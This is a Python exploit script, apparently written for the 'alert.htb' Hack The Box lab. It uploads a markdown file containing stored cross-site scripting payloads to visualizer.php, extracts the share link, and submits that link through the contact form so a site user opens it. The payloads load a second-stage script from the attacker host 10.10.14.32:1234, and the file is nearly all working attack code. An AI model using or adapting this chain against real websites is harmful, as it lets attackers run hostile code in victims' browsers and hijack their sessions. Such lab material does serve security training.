import requests

attacker_ip  = "10.10.14.32"
def upload_xss_payload() -> str:
    url = "http://alert.htb/visualizer.php"
    
    headers = {
        "Host": "alert.htb",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://alert.htb",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryB5gRHoqhMqRdZlXp",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://alert.htb/index.php?page=alert",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    # The payload content to be sent in the form-data file field
    payload_content = '''
    
        <script src="http://10.10.14.32:1234/stage.js?payload_from_script_tag"></script>
    
            <img src="http://10.10.14.32:1234/stage.js?payload_from_uploaded_file_img_tag" />'''
    
    # Manually constructing the multipart form-data content
    boundary = "----WebKitFormBoundaryB5gRHoqhMqRdZlXp"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="xss-payloads.md"\r\n'
        f"Content-Type: text/markdown\r\n\r\n"
        f"      {payload_content}\r\n"
        f"--{boundary}--\r\n"
    )
    
    # Send the POST request with manual multipart form-data
    response = requests.post(url, headers=headers, data=body)
  
    return extract_share_link(response.text) 
    

def extract_share_link(html_response): 
    from bs4 import BeautifulSoup

    """
    Extracts the href attribute from the first <a> tag in the HTML response.

    :param html_response: The HTML content as a string.
    :return: The href value of the <a> tag.
    """
    soup = BeautifulSoup(html_response, 'html.parser')
    
    # Find the first <a> tag and extract the href attribute
    a_tag = soup.find('a')
    if a_tag and 'href' in a_tag.attrs:
        return a_tag['href']
    else:
        return None    
    

def send_xss_in_contact_us(share_url: str):
    url = "http://alert.htb/contact.php"
    
    # Define headers for the request
    headers = {
        "Host": "alert.htb",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://alert.htb",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    # Define the form data to send
    payload = {
        "email": "a@gsdasd",  # email field
        "message": share_url
    }
    
    # Send the POST request with form data and headers
    response = requests.post(url, headers=headers, data=payload, allow_redirects=True)
    
    # Print the response from the server
    print("Response Status Code:", response.status_code)
    print("Response Text:", response.text)



# Execute the function
if __name__ == "__main__":
    share_url = upload_xss_payload()
    print("[+] Recived link to uploaded payload =>  " + share_url )
    
    send_xss_in_contact_us(share_url)
    
    
